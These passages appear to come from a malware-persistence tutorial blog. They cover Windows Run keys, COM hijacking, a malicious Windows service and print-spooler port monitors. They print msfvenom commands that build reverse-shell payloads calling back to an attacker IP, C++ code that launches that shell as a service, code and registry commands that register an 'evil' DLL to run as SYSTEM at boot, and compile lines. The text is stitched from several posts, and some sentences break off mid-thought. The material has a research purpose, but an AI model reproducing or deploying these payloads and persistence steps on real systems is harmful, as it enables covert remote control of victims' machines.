-fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n    \n\nThen, first of all, check registry keys in the victim's machine:    \n\n```powershell\nreg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n```\n\n    \n\nThen, run our `pers.exe` script and check again:   \n\n```powershell\n.\\pers.exe\nreg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n```\n\n    \n\nAs you can see, new key added as expected.    \nSo now, check everything in action. It's an interface technology that allows you to reuse items without knowing how they were made internally.     \nI'll show you how red commands can use COM objects to run arbitrary code on behalf of a trusted process in this post.    \n\nWhen a software needs to load a COM object, it uses the Windows API `CoCreateInstance` to construct an uninitialized object instance of a specific class, with the `CLSID` as one of the needed parameters (*class identifier*).\n\nWhen a program calls `CoCreateInstance` with a particular `CLSID` value, the operating system consults the registry to discover which binary contains the requested `COM` code:\n\n    \n\nThe contents of the `InProcServer32` subkey under the `CLSID` key seen in the previous image are presented in the next image:\n\n    \n\nIn my case, `firefox.exe` calling `CoCreateInstance` with `CLSID`: `{A1DB7B5E-D0EA-4FE0-93C4-314505788272}`. Various registry sub-keys are used during COM Hijacking depending on how the malicious code is run. credentials and is not a stealthy persistence approach.   \n\n### practical example\n\nLet's go to consider practical example: how to create and run a Windows service that receives a reverse shell for us.\n\nFirst of all create reverse shell `exe` file via `msfvenom` from my attacker machine:\n\n```bash\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4445 -f exe > meow.exe\n```\n\n    \n\n    \n\nThen, create service which run my `meow.exe` in the target machine.\n\nThe minimum requirements for a service are the following:\n- A Main Entry point (like any application)\n- A Service Entry point\n- A Service Control Handler\n\nIn the main entry point, you rapidly invoke `StartServiceCtrlDispatcher` so the `SCM` may call your Service Entry point (`ServiceMain`):\n\n```cpp\nint main() {\n  SERVICE_TABLE_ENTRY ServiceTable[] = {\n    {\"MeowService\", (LPSERVICE_MAIN_FUNCTION) ServiceMain},\n    {NULL, NULL}\n  };\n\n  StartServiceCtrlDispatcher(ServiceTable);\n  return 0;\n}\n```\n\nThe Service Main Entry Point performs the following tasks:\n- Initialize any required things that we postponed from the Main Entry Point.    \n- Register the service control handler (`ControlHandler`) that will process Service Stop, Pause, Continue, etc. control commands.    \n- These are registered as a bit mask via the `dwControlsAccepted` field of the `SERVICE STATUS` structure.    \n- Set Service Status to `SERVICE RUNNING`.\n- Perform initialization procedures. Such as creating threads/events/mutex/IPCs, etc.\n\n```cpp\nvoid ServiceMain(int argc, char** argv) {\n  serviceStatus.dwServiceType        = SERVICE_WIN32;\n  serviceStatus.dwCurrentState       = SERVICE_START_PENDING;\n  serviceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;\n  serviceStatus.dwWin32ExitCode      = 0;\n  serviceStatus.dwServiceSpecificExitCode = 0;\n  serviceStatus.dwCheckPoint         = 0;\n  serviceStatus.dwWaitHint           = 0;\n\n  hStatus = RegisterServiceCtrlHandler(\"MeowService\", (LPHANDLER_FUNCTION)ControlHandler);\n  RunMeow();\n\n  serviceStatus.dwCurrentState = SERVICE_RUNNING;\n  SetServiceStatus (hStatus, &serviceStatus);\n\n  while (serviceStatus.dwCurrentState == SERVICE_RUNNING) {\n    Sleep(SLEEP_TIME);\n  }\n  return;\n}\n```\n\nThe Service Control Handler was registered in your Service Main Entry point. Each service must have a handler to handle control requests from the SCM:\n```cpp\nvoid ControlHandler(DWORD request) {\n  switch(request) {\n    case SERVICE_CONTROL_STOP:\n      serviceStatus.dwWin32ExitCode = 0;\n      serviceStatus.dwCurrentState  = SERVICE_STOPPED;\n      SetServiceStatus (hStatus, &serviceStatus);\n      return;\n\n    case SERVICE_CONTROL_SHUTDOWN:\n      serviceStatus.dwWin32ExitCode = 0;\n      serviceStatus.dwCurrentState  = SERVICE_STOPPED;\n      SetServiceStatus (hStatus, &serviceStatus);\n      return;\n\n    default:\n      break;\n  }\n  SetServiceStatus(hStatus,  &serviceStatus);\n  return;\n}\n```\n\nI have only implemented and supported the `SERVICE_CONTROL_STOP` and `SERVICE_CONTROL_SHUTDOWN` requests. You can handle other requests such as `SERVICE_CONTROL_CONTINUE`, `SERVICE_CONTROL_INTERROGATE`, `SERVICE_CONTROL_PAUSE`, `SERVICE_CONTROL_SHUTDOWN` and others.\n\nAlso, create function with *evil* logic:\n\n```cpp\n// run process meow.exe - reverse shell\nint RunMeow() {\n  void * lb;\n  BOOL rv;\n  HANDLE th;\n\n  // for example: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4445 -f exe > meow.exe\n  char cmd[] = \"Z:\\\\2022-05-09-malware-pers-4\\\\meow.exe\";\n  STARTUPINFO si;\n  PROCESS_INFORMATION pi;\n  ZeroMemory(&si, sizeof(si));\n  si.cb = sizeof(si);\n  ZeroMemory(&pi, sizeof(pi));\n  CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);\n  WaitForSingleObject(pi.hProcess, INFINITE);\n  CloseHandle(pi.hProcess);\n  return 0;\n}\n\nint main() {\n  SERVICE_TABLE_ENTRY ServiceTable[] = {\n    {\"MeowService\", (LPSERVICE_MAIN_FUNCTION) ServiceMain},\n    {NULL, NULL}\n  };\n\n  StartServiceCtrlDispatcher(ServiceTable);\n  return 0;\n}\n```\n\nAs I wrote earlier, just create our reverse shell process (`meow.exe`):    \n\n    \n\nOf course, this code is not reference and it is more *\"dirty\"* Proof of Concept.    \n\n### demo\n\nLet's go to demonstration all.\n\nCompile our service:\n\n```bash\nx86_64-w64-mingw32-g++ -O2 meowsrv.cpp -o meowsrv.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n    \n\nWe can install the service from the command prompt by running the following command in target machine `Windows 10 x64`.       "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!\n\n    \n\nThis article is the result of my own research into the next interesting malware persistence trick: Port monitors.    \n\n### port monitors\n\nPort Monitor refers to the Windows Print Spooler Service or `spoolv.exe` in this post. When adding a printer port monitor, a user (or an attacker) is able to add an arbitrary dll that serves as the *\"monitor\"*.    \n\nThere are essentially two ways to add a port monitor, also known as your malicious DLL: through the Registry for persistence or a custom Windows application (`AddMonitor` function) for immediate dll execution.    \n\n### adding monitor\n\nUsing the Win32 API, specifically the `AddMonitor` function of the Print Spooler API:\n\n```cpp\nBOOL AddMonitor(\n  LPTSTR pName,\n  DWORD  Level,\n  LPBYTE pMonitors\n);\n```\n\nit is possible to add an arbitrary monitor DLL immediately while the system is running. Note that you will need local administrator privileges to add the monitor.    \n\nFor example, source code of our monitor:    \n\n```cpp\n/*\nmonitor.cpp\nwindows persistence via port monitors\nregister the monitor port\nauthor: @cocomelonc\nhttps://cocomelonc.github.io/tutorial/2022/06/19/malware-pers-8.html\n*/\n#include \"windows.h\"\n#pragma comment(lib, \"winspool\")\n\nint main(int argc, char* argv[]) {\n  MONITOR_INFO_2 mi;\n  mi.pName = \"Monitor\";\n  mi.pEnvironment = \"Windows x64\";\n  // mi.pDLLName = \"evil.dll\";\n  mi.pDLLName = \"evil2.dll\";\n  AddMonitor(NULL, 2, (LPBYTE)&mi);\n  return 0;\n}\n\n```\n\nCompile it:\n\n```bash\nx86_64-w64-mingw32-g++ -O2 monitor.cpp -o monitor.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lwinspool\n```\n\n    \n\nAlso, create our \"evil\" DLL:\n\n```bash\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4445 -f dll > evil2.dll\n```\n\n    \n\nSo, compiling the code will produce an executable (`monitor.exe` in my case) that will register the malicious DLL (`evil2.dll`) on the system.    \n\n### demo for add \"monitor\"\n\nCopy files and run:\n\n```powershell\ncopy Z:\\2022-06-19-malware-pers-8\\evil2.dll .\\\ncopy Z:\\2022-06-19-malware-pers-8\\monitor.exe .\\\n.\\monitor.exe\n```\n\n    \n\n### registry persistence\n\nA list of sub-key port monitors can be found within the `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors` node. Each key should have a `REG_SZ` entry containing a `Drivers` DLL. At system startup, each of these DLLs will be executed as `SYSTEM`.    \n\nFirst of all, before malicious actions, check sub keys:\n\n```powershell\nreg query \"HKLM\\System\\CurrentControlSet\\Control\\Print\\Monitors\" /s\n```\n\n    \n\nThen, add sub key `Meow` and `Driver` value:    \n\n```powershell\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\Print\\Monitors\\Meow\" /v \"Driver\" /d \"evil2.dll\" /t REG_SZ\nreg query \"HKLM\\System\\CurrentControlSet\\Control\\Print\\Monitors\" /s\n```\n\n    \n\nAs you can see, everything is completed correctly.
